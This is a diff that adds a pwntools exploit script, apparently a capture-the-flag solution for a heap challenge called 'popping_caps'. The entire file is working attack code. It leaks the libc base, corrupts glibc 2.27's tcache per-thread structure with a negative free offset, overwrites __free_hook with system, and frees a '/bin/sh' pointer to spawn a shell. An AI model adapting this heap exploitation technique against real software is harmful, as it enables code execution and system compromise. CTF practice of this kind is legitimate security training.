@@ -1,0 +1,46 @@
+from pwn import *
+
+# this shit about tache per thread
+
+exe = ELF("./popping_caps_patched")
+libc = ELF("./libc.so.6")
+ld = ELF("./ld-2.27.so")
+
+script = '''
+breakrva 0xB94
+breakrva 0xB56
+'''
+
+def malloc(size):
+    p.sendlineafter(b"choice: \n", b"1")
+    p.sendlineafter(b"many: \n", f"{size}".encode())
+    
+def free(pad):
+    p.sendlineafter(b"choice: \n", b"2")
+    p.sendlineafter(b"free: \n", f"{pad}".encode())
+
+def write(data):
+    p.sendlineafter(b"choice: \n", b"3")
+    p.sendafter(b"in: \n", data)
+
+p = process("./popping_caps_patched")
+#p = gdb.debug("./popping_caps_patched", gdbscript = script)
+
+p.recvuntil(b"is system ")
+libc_base = int(p.recvline(), 16) - 0x4f440
+__free_hook = libc_base + libc.symbols['__free_hook']
+system = libc_base + libc.symbols['system']
+binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
+
+malloc(0)
+free(-0x250)
+malloc(0x240)
+
+payload = p64(1) + p64(0) * 7 + p64(__free_hook) + p64(0) + b"/bin/sh\x00"
+write(payload)
+
+malloc(0)
+write(p64(system))
+free(binsh - __free_hook)
+
+p.interactive()
